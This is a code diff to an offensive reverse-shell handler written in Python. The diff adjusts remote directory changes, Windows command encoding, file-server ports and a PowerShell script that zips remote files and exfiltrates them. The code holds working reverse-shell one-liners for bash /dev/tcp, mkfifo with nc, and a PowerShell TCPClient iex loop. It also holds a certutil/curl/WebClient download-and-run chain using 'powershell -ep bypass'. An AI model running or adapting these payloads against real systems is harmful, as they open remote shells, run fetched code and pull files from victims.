@@ -1040,9 +1040,32 @@ class MainMenu(BetterCMD):
 		if not path:
 			print(paint(session.cwd).yellow)
 			return
-		path = shell_unescape(path)
-		target = session.exec(f"cd {shlex.quote(path)} 2>/dev/null && pwd", value=True)
-		if isinstance(target, str) and target.startswith('/'):
+		if session.OS == 'Windows':
+			try:
+				path_parts = shlex.split(path, posix=False)
+			except ValueError:
+				path_parts = []
+			if len(path_parts) != 1:
+				logger.error(f"Cannot change remote directory to: {paint(path).red}")
+				return
+			path = path_parts[0].strip('"')
+			path_b64 = base64.b64encode(path.encode()).decode()
+			script = (
+				f"$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{path_b64}'));"
+				"if(Test-Path -LiteralPath $p -PathType Container){"
+				"(Resolve-Path -LiteralPath $p).Path}"
+			)
+			encoded = base64.b64encode(script.encode('utf-16le')).decode()
+			target = session.exec(
+				f"powershell -NoProfile -EncodedCommand {encoded}",
+				force_cmd=True, value=True
+			)
+			valid_target = isinstance(target, str) and PureWindowsPath(target).is_absolute()
+		else:
+			path = shell_unescape(path)
+			target = session.exec(f"cd {shlex.quote(path)} 2>/dev/null && pwd", value=True)
+			valid_target = isinstance(target, str) and target.startswith('/')
+		if valid_target:
 			session._cwd = target
 			if session.agent:
 				session.exec(f"os.chdir({target!r})", python=True, value=True)
@@ -1328,7 +1351,7 @@ class MainMenu(BetterCMD):
 			elif quote:
 				if char == quote:
 					quote = None
-			elif char in "'\"":
+			elif char in ('"' if windows_paths else "'\""):
 				quote = char
 			elif char.isspace():
 				spans.append((start, i))
@@ -2385,7 +2408,7 @@ class TCPListener:
 		presets = [
 			"(bash >& /dev/tcp/{}/{} 0>&1) &",
 			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
-			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
+			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = [Text.Encoding]::UTF8.GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = [Text.Encoding]::UTF8.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Adapted from revshells.com
 		]
 
 		output = [str(paint(self).white_MAGENTA)]
@@ -2914,6 +2937,7 @@ class Session:
 	@property
 	def bin(self):
 		if not self._bin:
+			binaries = []
 			try:
 				if self.OS == "Unix":
 					binaries = [
@@ -3404,7 +3428,11 @@ class Session:
 			# Constructing the payload
 			if cmd is not None:
 				if force_cmd and self.subtype == 'psh':
-					cmd = f"cmd /c '{cmd}'"
+					cmd_b64 = base64.b64encode(cmd.encode()).decode()
+					cmd = (
+						f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{cmd_b64}'));"
+						"& $env:ComSpec /d /s /c $c"
+					)
 				initial_cmd = cmd
 				cmd = cmd.encode()
 
@@ -4166,24 +4194,16 @@ class Session:
 
 			with ExitStack() as stack:
 				remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
+				remote_paths = [t.strip('"') for t in shlex.split(remote_items, posix=False)]
 
-				remote_items_ps = r'\", \"'.join(t.strip('"') for t in shlex.split(remote_items, posix=False))
-				cmd = (
-					f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
-					' -DestinationPath $archivepath;'
-					'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
-					'Remove-Item $archivepath;'
-					'Write-Host $b64"'
-				)
+				with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False) as f:
+					tempfile_ps1 = f.name
+					stack.callback(lambda p=tempfile_ps1: os.path.exists(p) and os.remove(p))
+					f.write(windows_zip_script(remote_paths, remote_tempfile))
 
-				with tempfile.NamedTemporaryFile("w", suffix=".bat", delete=False) as f:
-					tempfile_bat = f.name
-					stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))
-					f.write(cmd)
-
-				server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
-				urlpath_bat = server.add(tempfile_bat)
-				temp_remote_file_bat = urlpath_bat.split("/")[-1]
+				server = FileServer(port=0, host=self._host, url_prefix=rand(8), quiet=True)
+				urlpath_ps1 = server.add(tempfile_ps1)
+				temp_remote_file_ps1 = urlpath_ps1.split("/")[-1]
 
 				server.start()
 				stack.callback(lambda: server.term.wait(options.timeout_short))
@@ -4193,13 +4213,13 @@ class Session:
 				if not hasattr(server, 'id'):
 					return []
 
-				_url = f'http://{self._host}:{server.port}{urlpath_bat}'
-				_dest = f'%TEMP%\\{temp_remote_file_bat}'
+				_url = f'http://{self._host}:{server.port}{urlpath_ps1}'
+				_dest = f'%TEMP%\\{temp_remote_file_ps1}'
 				data = self.exec(
 					f'(certutil -urlcache -split -f "{_url}" "{_dest}" >NUL 2>&1'
 					f' || curl -s -o "{_dest}" "{_url}" 2>NUL'
 					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\\"{_url}\\",\\"{_dest}\\")")'
-					f'&"{_dest}"&del "{_dest}"',
+					f'&powershell -nop -ep bypass -File "{_dest}"&del "{_dest}"',
 					force_cmd=True,
 					value=True,
 					timeout=None
@@ -4548,7 +4568,7 @@ class Session:
 		elif self.OS == 'Windows':
 			with ExitStack() as stack:
 				# Fire up File Server
-				server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
+				server = FileServer(port=0, host=self._host, url_prefix=rand(8), quiet=True)
 				server.start()
 				stack.callback(lambda: server.term.wait(options.timeout_short))
 				stack.callback(lambda: server.stop())
@@ -4583,12 +4603,14 @@ class Session:
 						else:
 							if item.is_dir():
 								altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
+								myzip.writestr(Path(altname).as_posix().rstrip('/') + '/', b'')
 								for p in item.rglob("*"):
-									if not p.is_file():
-										continue
 									rel = p.relative_to(item)
 									altname_file = Path(altname) / rel
-									myzip.write(p, arcname=str(altname_file))
+									if p.is_dir():
+										myzip.writestr(altname_file.as_posix().rstrip('/') + '/', b'')
+									elif p.is_file():
+										myzip.write(p, arcname=altname_file.as_posix())
 							else:
 								altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
 								myzip.write(item, arcname=altname)
@@ -6007,7 +6029,7 @@ class cleanup(Module):
 
 class FileServer:
 	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False, upload=False, upload_dir=None):
-		self.port = port or options.default_fileserver_port
+		self.port = options.default_fileserver_port if port is None else port
 		self.host = host or options.default_interface
 		self.host = Interfaces().translate(self.host)
 		self.items = items
@@ -6272,6 +6294,7 @@ class FileServer:
 			if not self.httpd.server_bind(self.host, self.port):
 				self.init.set()
 				return False
+			self.port = self.httpd.server_address[1]
 			self.httpd.server_activate()
 			self.id = core.new_fileserverID
 			core.fileservers[self.id] = self
@@ -6664,6 +6687,83 @@ def safe_tar_extractall(tar, dest, streaming=False, strip_prefixes=None):
 		warnings.simplefilter("ignore", category=DeprecationWarning)
 		tar.extractall(dest)
 	return extracted
+
+def windows_zip_script(remote_items, archive_path):
+	payload = base64.b64encode(json.dumps({
+		'archive': archive_path,
+		'paths': remote_items,
+	}).encode()).decode()
+	return dedent(rf'''
+	$ErrorActionPreference = 'Stop'
+	Add-Type -AssemblyName System.IO.Compression
+	Add-Type -AssemblyName System.IO.Compression.FileSystem
+	$payload = ConvertFrom-Json ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{payload}')))
+	$archivePath = [string]$payload.archive
+	$sourcePaths = @($payload.paths | ForEach-Object {{ [string]$_ }})
+	$archive = $null
+	$roots = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
+
+	function Add-ZipFile([string]$path, [string]$entryName) {{
+		$entryName = $entryName.Replace('\', '/')
+		[IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
+			$script:archive, $path, $entryName, [IO.Compression.CompressionLevel]::Optimal
+		) | Out-Null
+	}}
+
+	function Add-ZipDirectory([string]$path, [string]$entryRoot) {{
+		$entryRoot = $entryRoot.Replace('\', '/').TrimEnd('/')
+		$script:archive.CreateEntry($entryRoot + '/') | Out-Null
+		foreach ($child in Get-ChildItem -LiteralPath $path -Force -ErrorAction Stop) {{
+			$childEntry = $entryRoot + '/' + $child.Name
+			if ($child.PSIsContainer) {{
+				if (($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -ne 0) {{
+					$script:archive.CreateEntry($childEntry.Replace('\', '/').TrimEnd('/') + '/') | Out-Null
+				}} else {{
+					Add-ZipDirectory $child.FullName $childEntry
+				}}
+			}} else {{
+				Add-ZipFile $child.FullName $childEntry
+			}}
+		}}
+	}}
+
+	function Resolve-RequestedPath([string]$requestedPath) {{
+		if ($requestedPath.IndexOfAny([char[]]'*?') -ge 0) {{
+			$pattern = [Management.Automation.WildcardPattern]::Escape($requestedPath)
+			$pattern = $pattern.Replace('`*', '*').Replace('`?', '?')
+			$items = @(Get-Item -Path $pattern -Force -ErrorAction Stop)
+			if ($items.Count -eq 0) {{ throw "Path did not match any items: $requestedPath" }}
+			return $items
+		}}
+		return @(Get-Item -LiteralPath $requestedPath -Force -ErrorAction Stop)
+	}}
+
+	try {{
+		$archive = [IO.Compression.ZipFile]::Open($archivePath, [IO.Compression.ZipArchiveMode]::Create)
+		foreach ($requestedPath in $sourcePaths) {{
+			foreach ($item in @(Resolve-RequestedPath $requestedPath)) {{
+				$rootName = $item.Name
+				if ([string]::IsNullOrEmpty($rootName)) {{ $rootName = $item.PSDrive.Name }}
+				if (-not $roots.Add($rootName)) {{
+					throw "Multiple requested items have the same archive root name: $rootName"
+				}}
+				if ($item.PSIsContainer) {{
+					Add-ZipDirectory $item.FullName $rootName
+				}} else {{
+					Add-ZipFile $item.FullName $rootName
+				}}
+			}}
+		}}
+	}} catch {{
+		Write-Error $_
+		exit 1
+	}} finally {{
+		if ($null -ne $archive) {{ $archive.Dispose() }}
+	}}
+
+	[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivePath))
+	Remove-Item -LiteralPath $archivePath -Force
+	''').strip() + '\n'
 
 def url_to_bytes(URL):
 
